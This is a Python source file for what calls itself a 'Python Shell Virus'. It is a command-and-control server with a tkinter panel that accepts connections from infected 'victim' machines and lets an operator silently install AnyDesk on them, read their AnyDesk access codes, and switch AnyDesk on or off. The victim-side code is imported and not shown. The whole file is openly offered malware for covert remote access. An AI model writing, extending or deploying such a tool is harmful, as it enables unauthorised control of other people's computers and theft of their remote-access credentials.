import socket
import threading
import tkinter as tk
from tkinter.messagebox import showerror, showinfo
from constants import *
from victim import *


victims = []


def startServer():
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.bind((IP, PORT))
    soc.listen()

    while True:
        clientSoc, clientAddr = soc.accept()
        victims.append(Victim(clientSoc))
        print(f"{clientAddr} has been connected!")


def buildUI():
    """
    Builds the GUI of the program
    """

    print("Building UI...")

    window = tk.Tk()
    window.title("Python Shell Virus")

    # for scrolling vertically
    yscrollbar = tk.Scrollbar(window)
    yscrollbar.pack(side=tk.RIGHT, fill=tk.Y)

    # Headers Labels
    tk.Label(text="Welcome To The Python Virus Shell!").pack()
    tk.Label(text="What Would You Like To Do?").pack()

    # Opertaion list
    variable = tk.StringVar(window)
    variable.set(INSTALL_ANYDESK_COMMAND)  # default value
    opertaionList = tk.OptionMenu(window, variable,  INSTALL_ANYDESK_COMMAND,
                                  GET_CODE_COMMAND,  POWER_ON_ANYDESK_COMMAND,  POWER_OFF_ANYDESK_COMMAND)
    opertaionList.pack()

    # Victims list
    victims_list = tk.Listbox(window, selectmode="single",
                              yscrollcommand=yscrollbar.set)
    # Widget expands horizontally and
    # vertically by assigning both to
    # fill option
    victims_list.pack(padx=10, pady=10,
                      expand=tk.YES, fill="both")
    x = list(victims)

    for each_item in range(len(x)):
        victims_list.insert(tk.END, x[each_item].getAddr())
        victims_list.itemconfig(each_item, bg="lime")

    # Attach listbox to vertical scrollbar
    yscrollbar.config(command=victims_list.yview)

    # Start Button
    startBtn = tk.Button(
        text="Start!",
        command=lambda: startButtonOnClick(
            variable.get(), victims_list.get(tk.ACTIVE)),
    )
    startBtn.pack()

    # Reload Button
    reloadBtn = tk.Button(
        text="Reload!",
        command=lambda: reloadWindow(window),
    )
    reloadBtn.pack()

    window.mainloop()


def reloadWindow(window):
    """
    Reloads the GUI of the program

    For example when a new victim is connected we want to rebuild our ui 
    becusae we have to add the new victim to the victims list
    """

    print("Reloading UI...")
    window.destroy()
    buildUI()


def startButtonOnClick(command, selectedVictimAddr):

    if selectedVictimAddr == '':
        tk.Tk().withdraw()  # TODO: check that becuase i saw this on the stackoverflow example
        showerror("Error", "Please choose a victim!")
        print("Please choose a victim!")
    else:
        threading.Thread(target=processCommand, args=(
            command, selectedVictimAddr, )).start()


def processCommand(command, selectedVictimAddr):

    selectedVictim = None

    for victim in victims:
        if victim.getAddr() == selectedVictimAddr:
            selectedVictim = victim

    if command == INSTALL_ANYDESK_COMMAND:
        selectedVictim.initialize()

    elif command == GET_CODE_COMMAND:
        code = selectedVictim.getCode()
        if code == None:
            showerror("Anydesk code", "There is no code for this victim !")
        else:
            showinfo("Anydesk code",
                     f"The anydesk code for this victim is {code}")

    elif command == POWER_ON_ANYDESK_COMMAND:
        selectedVictim.powerOnAnydesk()

    elif command == POWER_OFF_ANYDESK_COMMAND:
        selectedVictim.powerOffAnydesk()


def main():
    threading.Thread(target=startServer).start()
    buildUI()


if __name__ == "__main__":
    main()
